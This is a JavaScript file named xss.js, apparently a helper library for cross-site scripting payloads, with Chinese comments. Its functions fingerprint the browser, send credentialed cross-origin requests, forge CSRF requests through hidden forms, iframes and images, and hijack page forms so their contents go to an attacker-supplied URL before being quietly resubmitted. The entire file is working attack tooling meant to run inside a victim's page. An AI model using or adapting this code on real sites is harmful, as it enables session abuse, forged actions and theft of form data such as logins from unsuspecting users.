;;var xss = function(){
        var x = {
                'name':'xss.js',
                'version':'0.2.1',
                'author':'长短短(sogili)'
        };

        x.x=function(id){return document.getElementById(id)};
        
        //容错取值
        x.e=function(_){try{return eval('('+_+')')}catch(e){return''}};
        
        //浏览器 
        x.i={
                i:!!self.ActiveXObject&&(function(){
                        for(var v=6,s=document.createElement('s');
                                s.innerHTML='<![if gt IE '+(v++)+']><i></i><![endif]-->',
                                s.getElementsByTagName('i')[0];);
                        return v;
                }()),
                c:!!self.chrome,
                f:self.mozPaintCount>-1,
                o:!!self.opera,
                s:!self.chrome&&!!self.WebKitPoint
        };
        
        //UA
        x.ua = navigator.userAgent;
        
        //判断是否为苹果手持设备
        x.apple=/ip(one|ad|od)/i.test(x.ua);
        
        //随机数
        x.rdm=function(){return~~(Math.random()*1e5)};

        //url编码(UTF8)
        x.ec=encodeURIComponent;

        x.html=function(){
                return document.getElementsByTagName('html')[0]
                                ||document.write('<html>')
                                ||document.getElementsByTagName('html')[0];
        };
        
        /*
         * 销毁一个元素
         */
        x.kill=function(e){
                e.parentElement.removeChild(e);
        };

        /*
         *绑定事件
         */
        x.bind=function(e,name,fn){
                e.addEventListener?e.addEventListener(name,fn,false):e.attachEvent("on"+name,fn);
        };
        
        /*
         * dom准备完毕时执行函数
         */
        x.ready=function(fn){
                if(!x.i.i){
                        x.bind(document,'DOMContentLoaded',fn);
                }else{
                        var s = setInterval(function(){
                                try{
                                        document.body.doScroll('left');
                                        clearInterval(s);
                                        fn();
                                }catch(e){}
                        },4);
                }
        }

        /*
         * 同源检测
         */
        x.o=function(url){
                var link = x.dom('<a href="'+encodeURI(url)+'">',1);
                return link.protocol+link.hoatname+':'+(link.port||80)==location.protocol+location.hoatname+':'+(location.port||80);
        };
        
        /*
         * html to dom
         */
        x.dom=function(html,gcsec){
                var tmp = document.createElement('span');
                tmp.innerHTML=html;
                var e = tmp.children[0];
                e.style.display='none';
                x.html().appendChild(e);
                gcsec>>0>0&&setTimeout(function(){
                        x.kill(e);
                },gcsec*1000);
                return e;
        };

        /*
         * ajax
         */         
        x.ajax=function(url,params,callback){
                (params instanceof Function)&&(callback=params,params=void(0));
                var XHR = (!x.o(url)&&window.XDomainRequest)||
                                  window.XMLHttpRequest||
                                  (function(){return new ActiveXObject('MSXML2.XMLHTTP')});
                var xhr = new XHR();
                xhr.open(params?'post':'get',url);
                xhr.withCredentials = true;
                try{params&&xhr.setRequestHeader('content-type','application/x-www-form-urlencoded');}catch(e){}
                callback&&(xhr.onreadystatechange = function() {
                        (this.readyState == 4 && ((this.status >= 200 && this.status <= 300) || this.status == 304))&&callback.apply(this,arguments);
                });
                xhr.send(params);
        };
        
        /*
         * CSRF
         */
        x.csrf=function(url,params,callback){
                (params instanceof Function)&&(callback=params,params=void(0));
                if(params){
                        var form = x.dom('<form method=post>');
                        form.action=url;
                        for(var name in params){
                                var input = document.createElement('input');
                                input.name=name;
                                input.value=params[name];
                                form.appendChild(input);
                        }
                        var iframe = x.dom('<iframe sandbox name=_'+x.rdm()+'_>',6);
                        callback&&setTimeout(function(){
                                x.bind(iframe,'load',callback);
                        },30);
                        form.target=iframe.name;
                        form.submit();
                }else{
                        var img = new Image();
                        callback&&(img.onerror=callback);
                        img.src=url;
                }
        };

        /*
         * 表单劫持
         */
        x.xform=function(form,action){
                form.old_action=form.action,form.old_target=form.target,form.action=action;
                var iframe = x.dom('<iframe name=_'+x.rdm()+'_>');
                form.target=iframe.name;
                setTimeout(function(){
                        x.bind(iframe,'load',function(){
                                form.action=form.old_action,form.target=form.old_target,form.onsubmit=null,form.submit();
                        });
                },30);
        };
        
        /*
         * 函数代理
         */
        x.proxy=function(fn,before,after){
                return function(){
                        before&&before.apply(this,arguments);
                        var result = fn.apply(this,arguments);
                        after&&after.apply(this,arguments);
                        return result;
                }
        };

        return x;
}();
